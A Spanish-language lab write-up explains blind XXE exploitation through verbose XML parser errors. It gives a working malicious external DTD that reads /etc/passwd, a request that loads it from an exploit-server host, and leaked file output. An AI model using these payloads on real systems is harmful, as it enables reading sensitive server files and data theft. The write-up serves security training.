# 6. XXE Blind con Mensajes de Error

## 🗄️ XXE ciego para filtrar datos con mensajes de error

### 📄 Descripción del laboratorio

Este laboratorio utiliza la funcionalidad **Check stock**, que envía un documento **XML** al servidor para procesarlo.

A diferencia de otros escenarios XXE:

* La aplicación **no refleja el contenido procesado** en la respuesta.
* No existe salida directa de datos procesados.

Sin embargo, el servidor devuelve **mensajes de error detallados cuando ocurre un fallo durante el parsing XML**.\
Estos errores incluyen rutas del sistema y datos que el parser intenta procesar.

Esto permite utilizar una técnica de **XXE ciega basada en mensajes de error**, donde se provoca un fallo intencionado que incluya el contenido de un archivo dentro del mensaje de error devuelto.

#### 🎯 Objetivo

Leer el contenido del archivo:

```
/etc/passwd
```

explotando una **XXE ciega mediante mensajes de error del parser XML**.

***

### 📚 Teoría

En escenarios de **XXE ciega**, normalmente existen dos limitaciones principales:

* El contenido procesado **no se refleja en la respuesta**.
* No siempre hay posibilidad de realizar **exfiltración out-of-band (DNS/HTTP)**.

Sin embargo, existe un tercer canal de exfiltración menos conocido:

#### 📌 Mensajes de error verbosos del parser XML

Muchos parsers XML devuelven **mensajes de error detallados** cuando ocurre un fallo durante el procesamiento de entidades o recursos externos.

Si esos errores se devuelven directamente al cliente, es posible utilizarlos para **exfiltrar datos sensibles**.

#### 📌 Idea del ataque

El ataque funciona en tres pasos:

1. Leer el archivo objetivo utilizando una **parameter entity**.
2. Construir una ruta inválida que incluya el contenido del archivo.
3. Forzar al parser a intentar acceder a esa ruta inexistente.

Cuando el parser intenta abrir la ruta:

```
file:///nonexistent/<contenido_del_archivo>
```

ocurre un error como:

```
FileNotFoundException
```

El mensaje de error incluye la ruta completa, lo que provoca que el **contenido del archivo aparezca dentro del error devuelto por el servidor**.

Esto permite realizar **exfiltración in-band incluso en escenarios XXE ciegos**.

Este tipo de vulnerabilidad es común en:

* entornos de desarrollo o debug
* aplicaciones Java o PHP con errores verbosos
* APIs que devuelven excepciones internas completas

***

Observamos que:

* Cuando provocamos errores de parsing, el servidor devuelve **mensajes de error detallados**.

Esto confirma que:

* El servidor está realizando **parsing XML real**.
* Los errores **no están saneados ni ocultos**.

***

#### 2️⃣ Crear la DTD externa maliciosa

Como las entidades externas clásicas están bloqueadas, utilizamos:

* **parameter entities**
* **DTD externa**

Accedemos al **Exploit Server** del laboratorio y creamos un nuevo exploit con el siguiente contenido:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

📌 **Qué hace cada parte**

* **%file**

Lee el contenido completo del archivo:

```
/etc/passwd
```

* **%eval**

Define dinámicamente una nueva entity llamada `%error`.

* **%error**

Fuerza al parser a intentar abrir una ruta inexistente que incluye el contenido del archivo:

```
file:///nonexistent/<contenido_de_/etc/passwd>
```

Esto provoca un error inevitable en el parser.

Guardamos el exploit con **Store**.

El Exploit Server genera una URL pública similar a:

```
https://TU-EXPLOIT-ID.exploit-server.net/exploit
```

***

#### 3️⃣ Referenciar la DTD externa desde el XML

Volvemos al **Repeater** y modificamos la petición XML para cargar la DTD externa:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://TU-EXPLOIT-ID.exploit-server.net/exploit">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

Enviamos la petición al servidor.

***

#### 4️⃣ Exfiltración mediante mensaje de error

La respuesta del servidor ahora contiene un error del parser XML, por ejemplo:

```bash
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

<figure><img src="../../../.gitbook/assets/image (481).png" alt=""><figcaption></figcaption></figure>

El contenido completo de **/etc/passwd** aparece incrustado dentro del mensaje de error.

Esto ocurre porque el parser intenta abrir una ruta inexistente que contiene el contenido del archivo leído previamente.

***

#### 5️⃣ Resultado

Se consigue:

* Explotar una **XXE ciega**
* Utilizar **parameter entities**
* Ejecutar una **DTD externa**
* Provocar un error intencionado del parser
* Exfiltrar el contenido de **/etc/passwd** mediante el mensaje de error

El laboratorio se marca como **resuelto correctamente**.
